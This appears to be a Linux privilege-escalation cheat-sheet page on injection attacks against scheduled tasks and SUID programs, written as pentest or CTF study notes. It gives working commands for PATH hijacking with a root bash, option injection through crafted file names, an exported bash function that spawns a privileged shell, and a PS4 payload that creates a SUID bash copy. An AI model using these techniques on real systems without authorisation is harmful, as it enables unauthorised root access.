# Injection

<div class="row row-cols-lg-2"><div>

If there is some code that can is executed as another user, for instance, a [scheduled task](tasks.md) or a [program with the SUID bit](perms.md#suidguid-bit), you may be able to modify the code behavior using injection.

‚û°Ô∏è You may need/want to create a [root bash](rootbash.md).
</div><div>

There are basic scenarios in which you can directly exploit the executable, but in other scenarios, you may have to exploit the environment itself. In short, it means you may:

* üå∏ edit the environment variables
* üåø edit the files used by the program
* üé≠ create a file named after the parameters of the command. For instance, if the code uses a glob-pattern, the pattern will be replaced with the matching files. So, you may inject parameters.
* üê¶ use a flaw in the script language
* ...

If you can run a script, you may try to see if the script uses your PATH to work. The easiest way to test that is to empty your PATH.

```shell!
$ bash -c 'export PATH=; <execute the script>'
"xxx" command not found ====> OK!
```

You can then try to replace the command binary by a [rootbash](rootbash.md). 

```
$ ls /tmp/rootbash # assuming you created your rootbash
$ ln -s /tmp/rootbash # replace the command "xxx"
$ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
<your bash is called>
```

‚ö†Ô∏è If you are not able to edit the PATH, try to see if you can write files in a folder in the PATH that is before the original folder.
</div><div>

Unfortunately, this doesn't work when the command is invoked with some options, such as `tail -f /var/log/nginx/access.log`.

The trick is to create a script that launches our command. Refer to [Root Bash Script](rootbash.md).

```shell!
$ ln -s /tmp/root.sh /tmp/xxx # your command
$ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
<your bash is called>
```

## Parameters injection  üé≠

To execute any command with filename starting with `-`, you need to use `--` such as `rm -- -la` to remove the file `-la`.

We can inject arguments when [glob-patterns](/operating-systems/linux/_knowledge/index.md#glob-patterns) are replaced.
</div><div>

For instance, to inject `-la` into `ls`:

```shell!
$ touch -- -la
$ ls
-la
$ ls * # * was replaced by -la
total 8
drwxr-xr-x 2 xxx xxx 4096 Apr 29 18:50 .
drwxr-xr-x 9 xxx xxx 4096 Apr 29 18:50 ..
-rw-r--r-- 1 xxx xxx    0 Apr 29 18:50 -la
```

## Bash scripts failures üê¶

<div class="row row-cols-lg-2"><div>

**Bash versions <4.2-048**: it is possible to create functions named after a path, which allows us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.

```bash!
function /some/path { /bin/bash -p; }
export -f /some/path
```
</div><div>

**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.

```shell!
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
```
